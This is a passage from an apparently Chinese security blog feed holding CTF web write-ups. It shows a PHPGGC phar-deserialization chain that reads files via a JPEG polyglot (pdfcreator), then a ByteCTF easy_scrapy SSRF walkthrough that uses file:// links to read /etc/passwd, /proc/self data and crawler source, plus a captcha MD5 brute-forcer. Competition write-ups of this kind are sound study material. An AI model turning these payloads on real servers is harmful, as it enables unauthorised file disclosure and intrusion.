src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/03C73EAE-9B6D-4097-86BF-675DAD58D598.png"></p><p>接着开始读/etc/apache2/sites-enabled/000-default.conf（修改上方高亮出），可以从这个文件中判断文件路径。在执行第一行命令的时候可能会报错(一堆输出)，可以不用理会。最终得到web的根路径为 /var/www/html。设置$o-&gt;tmpfile = “ /var/www/html/flag.php”，使用 F12 查看源码即可得到 flag。</p><blockquote><p>$flag = “flag{7f5c676fb4a062752124bcaf69a01701}”;</p></blockquote><hr><h1 id="方法2-使用-PHPGGC-来实现-LFI（Local-File-Include）"><a href="#方法2-使用-PHPGGC-来实现-LFI（Local-File-Include）" class="headerlink" title="方法2: 使用 PHPGGC 来实现 LFI（Local File Include）"></a>方法2: 使用 PHPGGC 来实现 LFI（Local File Include）</h1><p>下载并且初始化 phpggc（复制模版）。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">$ git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/ambionics/</span>phpggc<br>$ cd phpggc<br>$ mkdir gadgetchains<span class="hljs-regexp">/Alles/</span> &amp;&amp; mkdir gadgetchains<span class="hljs-regexp">/Alles/</span>FR &amp;&amp; mkdir gadgetchains<span class="hljs-regexp">/Alles/</span>FR/<span class="hljs-number">1</span> <br>$ cp templates<span class="hljs-regexp">/* gadgetchains/</span>Alles<span class="hljs-regexp">/FR/</span><span class="hljs-number">1</span>/*<br></code></pre></td></tr></table></figure><p>修改 gadgetchains/Alles/FR/1/ 下的 chain.php。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">PDFStuff</span> &#123;<br>  <span class="hljs-title">class</span> <span class="hljs-title">PDFCreator</span> &#123; <span class="hljs-title">public</span> $<span class="hljs-title">tmpfile</span>; &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title">GadgetChain</span>\<span class="hljs-title">Alles</span> &#123;<br>    <span class="hljs-title">class</span> <span class="hljs-title">FR1</span> <span class="hljs-title">extends</span> \<span class="hljs-title">PHPGGC</span>\<span class="hljs-title">GadgetChain</span>\<span class="hljs-title">FileRead</span> &#123;<br>        public static $version = &#x27;1.00&#x27;;<br>        <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> $vector = <span class="hljs-string">&#x27;__destruct&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> $author = <span class="hljs-string">&#x27;teamrocketist&#x27;</span>;<br><br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">generate</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> $parameters</span>) </span>&#123;<br>            $a = <span class="hljs-keyword">new</span> \PDFStuff\PDFCreator();<br>            $a-&gt;tmpfile = $parameters[<span class="hljs-string">&quot;remote_file&quot;</span>]; <span class="hljs-comment">// file to read</span><br>            <span class="hljs-keyword">return</span> $a;<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>生成 phar 的图片，使用 /etc/passwd 更容易回显结果（有的 php 源码在浏览器中需要查看源码才能看到，比如 flag.php）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">./phpggc Alles/FR1 /etc/passwd -f -pj ../dummy.jpg -o ../exploit.jpg<br><br></code></pre></td></tr></table></figure><p>然后和上面的步骤一样，上传就可以读取文件。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/254F244D-5867-46BA-9C85-A952E884343C.png"></p><hr><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><p>在题解中，发现一个非常强大的工具——PHPGGC</p><p>PHPGGC 是一款能够自动生成主流框架的序列化测试 payload 的工具,可以说是反序列化的武器库,平时遇到有关反序列化的题目时如果能够熟练运用它，将节省大量功夫。</p><p>可以创建自己的模块，使用命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> git <span class="hljs-built_in">clone</span> https://github.com/ambionics/phpggc</span><br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">cd</span> phpggc</span><br><span class="hljs-meta">$</span><span class="bash"> mkdir gadgetchains/Alles/ &amp;&amp; mkdir gadgetchains/Alles/FR &amp;&amp; mkdir gadgetchains/Alles/FR/1</span><br><span class="hljs-meta">$</span><span class="bash"> cp templates/* gadgetchains/Alles/FR/1/*</span><br></code></pre></td></tr></table></figure><p>默认的模版 chain.php：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">GadgetChain</span>\&#123;<span class="hljs-title">NAME</span>&#125;;<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> </span>&#123;CLASS_NAME&#125; <span class="hljs-keyword">extends</span> \&#123;BASE_CLASS_NAME&#125;<br>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> $version = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> $vector = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> $author = <span class="hljs-string">&#x27;&#x27;</span>;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">generate</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> $parameters</span>)</span><br><span class="hljs-function">    </span>&#123;<br><br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>参考文章中的模块 chain.php：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">PDFStuff</span> &#123;<br>  <span class="hljs-title">class</span> <span class="hljs-title">PDFCreator</span> &#123; <span class="hljs-title">public</span> $<span class="hljs-title">tmpfile</span>; &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title">GadgetChain</span>\<span class="hljs-title">Alles</span> &#123;<br>    <span class="hljs-title">class</span> <span class="hljs-title">FR1</span> <span class="hljs-title">extends</span> \<span class="hljs-title">PHPGGC</span>\<span class="hljs-title">GadgetChain</span>\<span class="hljs-title">FileRead</span> &#123;<br>        public static $version = &#x27;1.00&#x27;;<br>        <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> $vector = <span class="hljs-string">&#x27;__destruct&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> $author = <span class="hljs-string">&#x27;teamrocketist&#x27;</span>;<br><br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">generate</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> $parameters</span>) </span>&#123;<br>            $a = <span class="hljs-keyword">new</span> \PDFStuff\PDFCreator();<br>            $a-&gt;tmpfile = $parameters[<span class="hljs-string">&quot;remote_file&quot;</span>]; <span class="hljs-comment">// file to read</span><br>            <span class="hljs-keyword">return</span> $a;<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>其中 version、vector、author 在查看当前模块信息的时候会显示，如下图所示。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/1B804691-FA75-4CAF-9B5C-4305E7974FF1.png"></p><p>构建phar的命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">./phpggc Alles/FR1 flag.php -f -pj ../dummy.jpg -o ../exploit.jpg<br></code></pre></td></tr></table></figure><p>参数「-f」使用 fast-destruct 的方法，确保对象在反序列化的时候，能被摧毁。参数「-pj」创建 jpeg 格式的 phar，dummy.jpg 是一张普通图片。参数「-o」明确说明 payload 的输出地址。flag.php 是模块需要的参数，需要读取的远程文件的地址</p><hr><h1 id="反序列化分析"><a href="#反序列化分析" class="headerlink" title="反序列化分析"></a>反序列化分析</h1><p>在搜索到 TCPDF 的 cve，漏洞是由于 phar 类型的 php 反序列化导致的。故寻找 TCPDF 的利用点。这个地方需要使用到大型代码审计的技巧，通常可以按照如下所示的几个步骤来进行审计。</p><ol><li>找到危险函数；此处的危险函数一定在 反序列化所使用到的类，一定在类里的魔术方法里。</li><li>向上回溯寻找有无可用输入点；寻找可控输入点。</li><li>尝试绕过针对输入点的过滤；</li><li>寻找触发漏洞的方法。</li></ol><p>而这个地方我们已经找到了漏洞，就需要先理清代码的基本逻辑思路。（关键点肯定在「类」中，毕竟这个题的考点是反序列化），可以考虑直接审计反序列化代码，再回溯利用点。</p><p>先在 creator.php 中找到魔术方法，并寻找危险函数（由于 this-&gt;tmpfile 在反序列时可控），故需要进行反序列化然后本地文件包含，tmpfile 设置为我们需要的函数。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/A5780B58-D39F-4E52-809F-EA15216A4BB0.png"></p><p>编写生成 phar 代码</p><ul><li>方法1: phpggc 工具<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/D31F2612-132F-48E3-BBA0-8B99AA623F93.png"></li><li>方法2:手动编写<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/1E138875-D810-430B-ABD0-9F4594E2C11D.png"></li></ul><p>最后需要使用包装器执行代码，如下图所示：<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20201101001720.png"></p><p>参考教程：</p><ol><li><a href="https://xz.aliyun.com/t/6699#toc-2">php反序列化拓展攻击详解–phar</a></li><li><a href="https://teamrocketist.github.io/2019/08/25/Web-Chaos-Communication-Camp-2019-CTF-pdfcreator/">Chaos Communication Camp 2019 CTF - pdfcreator</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>php反序列化</tag>
      
      <tag>phar</tag>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2020年10月ByteCTF部分web题解</title>
    <link href="/2020/10/25/2020%E5%B9%B410%E6%9C%8825%E6%97%A5-ByteCTF%E9%A2%98%E8%A7%A3/"/>
    <url>/2020/10/25/2020%E5%B9%B410%E6%9C%8825%E6%97%A5-ByteCTF%E9%A2%98%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<p>题解和题目地址：<a href="https://github.com/ctfwiki/ctf_game_history/blob/master/2020/ByteCTF.md">https://github.com/ctfwiki/ctf_game_history/blob/master/2020/ByteCTF.md</a><br>官方题解：<a href="https://bytectf.feishu.cn/docs/doccnqzpGCWH1hkDf5ljGdjOJYg#xQHQ9D">https://bytectf.feishu.cn/docs/doccnqzpGCWH1hkDf5ljGdjOJYg#xQHQ9D</a></p><hr><a id="more"></a><p>用于爆破 md5 的脚本（验证码）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># crack.py</span><br><br><span class="hljs-keyword">import</span> hashlib<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">md5</span>(<span class="hljs-params">s</span>):</span><br>    <span class="hljs-keyword">return</span> hashlib.md5(s.encode()).hexdigest()<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    c = input()<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>, <span class="hljs-number">9999999999</span>):<br>        <span class="hljs-keyword">if</span> md5(str(i)).startswith(c):<br>            print(i)<br>            print(<span class="hljs-string">&#x27;----------------&#x27;</span>)<br>            <span class="hljs-keyword">break</span><br><br></code></pre></td></tr></table></figure><hr><h1 id="easy-scrapy"><a href="#easy-scrapy" class="headerlink" title="easy_scrapy"></a>easy_scrapy</h1><ul><li>题目地址：<a href="http://101.200.50.18:30010/">http://101.200.50.18:30010/</a></li><li>官方题解：<a href="https://bytectf.feishu.cn/docs/doccnqzpGCWH1hkDf5ljGdjOJYg#bFxJPC">https://bytectf.feishu.cn/docs/doccnqzpGCWH1hkDf5ljGdjOJYg#bFxJPC</a></li><li>oxcccccc：<a href="http://blog.ccreater.top/2020/10/26/2020ByteCTF/">http://blog.ccreater.top/2020/10/26/2020ByteCTF/</a></li><li>N0rth3题解：<a href="https://northity.com/2020/10/30/ByteCTF%E5%88%9D%E8%B5%9B%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/">https://northity.com/2020/10/30/ByteCTF%E5%88%9D%E8%B5%9B%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/</a></li><li>ByteCTF2020-easyscrapy：<a href="https://www.jianshu.com/p/0823666a7687">https://www.jianshu.com/p/0823666a7687</a></li><li>ByteCTF2020—w4nder：<a href="http://phoebe233.cn/?p=328#easyscrapy">http://phoebe233.cn/?p=328#easyscrapy</a></li></ul><p>经过测试，该网站会爬取提交的链接以及链接中的外链，并且提交链接的类型只能是 HTTPS。我当时只在提交链接的部分测试了SSRF，以后在做题时，需要边做边写题解，这样会让自己的思路更加的清晰和正确。</p><p>在 服务器编写 1.html ，然后提交 url 即可得到 /etc/passwd 文件，成功本地文件包含，返回结果如下。</p><figure class="highlight sml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sml"><br>b&#x27;&lt;a href=<span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;\n&#x27;<br><br></code></pre></td></tr></table></figure><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/C64DAEFD-214C-40D8-8BFF-24326D290575.png"></p><p>考虑去读取爬虫的源码，但是并不知道路径，尝试 proc 目录。GET 新姿势，在服务器源码中写入下面的代码并提交。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br>&lt;a <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;file:///proc/self/cmdline&quot;</span>&gt;<br><br></code></pre></td></tr></table></figure><p>proc/self/cmdline 中 /proc/self  是指向当前进程的内存，/proc/self/cmdline 启动进程时执行的命令。类似的接口还有：</p><ul><li>/proc/$PID/environ 该文件保存进程的环境变量</li><li>/proc/$PID/cwd 一个符号连接, 指向进程当前的工作目录</li><li>/proc/$PID/exe 一个符号连接, 指向被执行的二进制代码</li><li>/proc/$PID/fd 进程所打开的每个文件都有一个符号连接在该子目录里, 以文件描述符命名, 这个名字实际上是指向真正的文件的符号连接</li><li>/proc/$PID/attr 进程的属性<br>tip: 当找不到网站路径的时候，可以利用 /proc/self/cwd 目录来读取文件路径</li></ul><p>当提交请求后的返回结果为：</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><br>b<span class="hljs-string">&#x27;/usr/local/bin/python\x00/usr/local/bin/scrapy\x00crawl\x00byte\x00&#x27;</span><br># 解码后：<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/bin/</span>python <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/bin/</span>scrapy crawl <span class="hljs-keyword">byte</span><br><br></code></pre></td></tr></table></figure><p>b’ 是 Python 的 bytes 类型，表明这个变量在存储的时候是 bytes 类型（二进制形式）。上面的命令可以被化简为 python scrapy crawl byte，这是 scrapy 的启动命令。爬虫的名称叫做 byte，在 spiders 目录中有用。</p><h2 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h2><p>我们可以参考 <a href="https://scrapy-chs.readthedocs.io/zh_CN/0.24/topics/commands.html#scrapy">scrapy 的文档</a>，我们可以知道 scrapy 的目录结构（贯穿全文）</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><br>scrapy.cfg<br>myproject/（项目名称，未知）<br>    __init__.py<br>    items.py<br>    pipelines.py<br>    settings.py<br>    spiders/<br>        __init__.py<br>        spider1.py<br>        spider2.py<br>        ...<br><br></code></pre></td></tr></table></figure><p>目录结构 +  /proc/self/cwd 来进行文件读取。首先尝试读取 scrapy.cfg 文件（另外的数据需要使用项目名称）。构造 SSRF 的 url 如下：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br>&lt;a <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;file:///proc/self/cwd/scrapy.cfg&quot;</span>&gt;<br><br></code></pre></td></tr></table></figure><p>其中 /proc/self/cwd/ 指向工作路径（current work directory 简称 cwd），读取工作路径下的 scrapy.cfg 文件。再次提交 url，返回结果如下：</p><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs latex"># scrapy.cfg<br><br>b&#x27;# Automatically created by: scrapy startproject<span class="hljs-tag">\<span class="hljs-name">n</span></span>#<span class="hljs-tag">\<span class="hljs-name">n</span></span># For more information about the [deploy] section see:<span class="hljs-tag">\<span class="hljs-name">n</span></span># https://scrapyd.readthedocs.io/en/latest/deploy.html<span class="hljs-tag">\<span class="hljs-name">n</span></span><span class="hljs-tag">\<span class="hljs-name">n</span><span class="hljs-string">[settings]</span></span><span class="hljs-tag">\<span class="hljs-name">ndefault</span> = </span>bytectf.settings<span class="hljs-tag">\<span class="hljs-name">n</span></span><span class="hljs-tag">\<span class="hljs-name">n</span><span class="hljs-string">[deploy]</span></span><span class="hljs-tag">\<span class="hljs-name">n</span></span>#url = http://localhost:6800/<span class="hljs-tag">\<span class="hljs-name">nproject</span> = </span>bytectf<span class="hljs-tag">\<span class="hljs-name">n</span></span>&#x27;<br><br></code></pre></td></tr></table></figure><p>这种格式的文本不便于进行阅读，Python 的 Bytes 直接输出就会呈现这种效果，使用 vscode 的替换功能将 \n 转换成“换行”。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/472EE1BB-6765-4B4D-B9F0-341E25B7D163.png"><br>修改为“正则模式”进行替换，将 “\n” 替换成 “\n”。通过上面的文本，我们就能够读取所有的文件了。</p><p>尝试读取 setting 文件。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br>&lt;a <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;file:///proc/self/cwd/bytectf/setting.py&quot;</span>&gt;（凭感觉在写代码。。）<br>&lt;a <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;file:///proc/self/cwd/bytectf/settings.py&quot;</span>&gt;<br><br></code></pre></td></tr></table></figure><p>？？？做着做着访问不了了（希望环境没事🙏。等待几分钟后环境恢复，估计是在重启。</p><p>参考上面的处理方法，将返回结果整理如下：（参考教程：<a href="https://www.cnblogs.com/fengf233/p/11400262.html%EF%BC%89">https://www.cnblogs.com/fengf233/p/11400262.html）</a></p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs vala"><span class="hljs-meta"># setting.py</span><br><br>BOT_NAME = <span class="hljs-string">&#x27;bytectf&#x27;</span><br><span class="hljs-meta"># 此Scrapy项目名称</span><br><br>SPIDER_MODULES = [<span class="hljs-string">&#x27;bytectf.spiders&#x27;</span>]<br><span class="hljs-meta"># scrapy查找spider的路径</span><br><br>NEWSPIDER_MODULE = <span class="hljs-string">&#x27;bytectf.spiders&#x27;</span><br><span class="hljs-meta"># 指定使用genspider时创建spider的路径</span><br><br>RETRY_ENABLED = False<br><span class="hljs-meta"># </span><br>ROBOTSTXT_OBEY = False<br><span class="hljs-meta"># 表示遵不遵守君子协议，默认False</span><br><br>DOWNLOAD_TIMEOUT = <span class="hljs-number">8</span><br><span class="hljs-meta"># 超时时间</span><br><br>USER_AGENT = <span class="hljs-string">&#x27;scrapy_redis&#x27;</span><br><span class="hljs-meta"># 爬虫时使用的默认User-Agent</span><br><br>SCHEDULER = <span class="hljs-string">&quot;scrapy_redis.scheduler.Scheduler&quot;</span><br><span class="hljs-meta"># </span><br><br>DUPEFILTER_CLASS = <span class="hljs-string">&quot;scrapy_redis.dupefilter.RFPDupeFilter&quot;</span><br><span class="hljs-meta"># </span><br><br>REDIS_HOST = <span class="hljs-string">&#x27;172.20.0.7&#x27;</span><br><span class="hljs-meta"># redis 服务器地址</span><br><br>REDIS_PORT = <span class="hljs-number">6379</span><br><span class="hljs-meta"># redis 端口</span><br><br>ITEM_PIPELINES = &#123;<br><span class="hljs-string">&#x27;bytectf.pipelines.BytectfPipeline&#x27;</span>: <span class="hljs-number">300</span>,<br>&#125;<br><span class="hljs-meta"># 启用的item管道</span><br></code></pre></td></tr></table></figure><p>在其他人的题解中，他们尝试了攻击 redis，但是没有拿到 shell。我不会（暂时就不尝试了。在这个文件中没有 spider 的名称，考虑从  <strong>init</strong>.py 这个已知的文件入手。尝试读取  <strong>init</strong>.py 文件。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br>&lt;a <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;file:///proc/self/cwd/bytectf/spiders/__init__.py&quot;</span>&gt;<br><br></code></pre></td></tr></table></figure><p>没有数据</p><p>尝试读取 byte.py 文件（暂时还不清楚这个文件名「byte.py」的来源，猜测可能在 items.py、pipelines.py、bytectf/<strong>init</strong>.py 这些没有读取的文件中）。折腾了半天才在启动命令中发现爬虫的名称叫做 byte.py，当时没有理解这个命令的含义，血亏。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br>&lt;a <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;file:///proc/self/cwd/bytectf/spiders/byte.py&quot;</span>&gt;<br><br></code></pre></td></tr></table></figure><p>将回显结果进行整理。代码有点乱，Python 的缩进全无，只能依靠猜测源码大致的模样（\x 乱码使用 print(b””.decode(“utf-8”) 转换为中文)）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-comment"># byte.py</span><br><br><span class="hljs-keyword">import</span> scrapy<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> scrapy_redis.spiders <span class="hljs-keyword">import</span> RedisSpider<br><span class="hljs-keyword">from</span> bytectf.items <span class="hljs-keyword">import</span> BytectfItem<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ByteSpider</span>(<span class="hljs-params">RedisSpider</span>):</span><br>    name = <span class="hljs-string">&#x27;byte&#x27;</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">parse</span>(<span class="hljs-params">self, response</span>):</span><br>        byte_item = BytectfItem()<br>        <span class="hljs-comment"># 主键，原始 url</span><br>        byte_item[<span class="hljs-string">&#x27;byte_start&#x27;</span>] = response.request.url<br>        url_list = []<br>        test = response.xpath(<span class="hljs-string">&#x27;//a/@href&#x27;</span>).getall()<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> test:<br>            <span class="hljs-keyword">if</span> i[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;/&#x27;</span>:<br>                url = response.request.url + i<br>            <span class="hljs-keyword">else</span>:<br>                url = i<br>            <span class="hljs-keyword">if</span> re.search(<span class="hljs-string">r&#x27;://&#x27;</span>, url):<br>                r = scrapy.Request(url, callback=self.parse2, dont_filter=<span class="hljs-literal">True</span>)<br>                r.meta[<span class="hljs-string">&#x27;item&#x27;</span>] = byte_item<br>                <span class="hljs-keyword">yield</span> r<br>            url_list.append(url)<br>            <span class="hljs-keyword">if</span>(len(url_list) &gt; <span class="hljs-number">3</span>):<br>                <span class="hljs-keyword">break</span><br>        byte_item[<span class="hljs-string">&#x27;byte_url&#x27;</span>] = response.request.url<br>        byte_item[<span class="hljs-string">&#x27;byte_text&#x27;</span>] = base64.b64encode((response.text).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>        <span class="hljs-keyword">yield</span> byte_item<br><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">parse2</span>(<span class="hljs-params">self, response</span>):</span><br>        item = response.meta[<span class="hljs-string">&#x27;item&#x27;</span>]<br>        item[<span class="hljs-string">&#x27;byte_url&#x27;</span>] = response.request.url<br>        item[<span class="hljs-string">&#x27;byte_text&#x27;</span>] = base64.b64encode((response.text).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>        <span class="hljs-keyword">yield</span> item<br><br></code></pre></td></tr></table></figure><p>尝试读取前面猜测的文件，items.py、pipelines.py、bytectf/<strong>init</strong>.py</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br>&lt;a <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;file:///proc/self/cwd/bytectf/items.py&quot;</span>&gt;<br>&lt;a <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;file:///proc/self/cwd/bytectf/pipelines.py&quot;</span>&gt;<br>&lt;a <span class="hljs-attribute">href</span>=<span 